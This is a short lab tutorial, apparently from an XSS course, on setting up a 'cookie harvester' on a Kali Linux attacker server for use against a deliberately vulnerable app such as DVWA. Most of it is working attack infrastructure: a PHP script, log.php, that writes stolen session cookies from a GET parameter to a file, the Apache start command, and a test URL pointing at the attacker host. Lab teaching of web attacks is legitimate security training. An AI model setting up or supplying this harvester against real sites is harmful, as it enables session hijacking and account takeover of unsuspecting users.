Setting Up a Cookie Harvester

Preparing the Attacker's Server for Cookie Theft

Prerequisites

  • Kali Linux VM (attacker machine).
  • Apache web server installed and running on Kali.
  • A vulnerable web application (e.g., DVWA) for testing.

Step 1: Create log.php

Create /var/www/html/log.php with the following content:

<?php
$cookie = $_GET['cookie'];
$log_file = 'cookies.txt';
file_put_contents($log_file, $cookie . "
", FILE_APPEND);
echo "Thank you for your feedback!";
?>

Step 2: Start Apache Server

Ensure your Apache web server is running on Kali:

sudo service apache2 start

You can check its status with sudo service apache2 status.

Step 3: Verify Harvester Functionality

Open a browser on Kali and navigate to:

http://YOUR_KALI_IP/log.php?cookie=test

You should see "Thank you for your feedback!" and /var/www/html/cookies.txt should contain "test".

Key Takeaway

A cookie harvester is a simple server-side script designed to capture and log stolen session cookies, forming the essential backend for XSS-based cookie theft attacks.
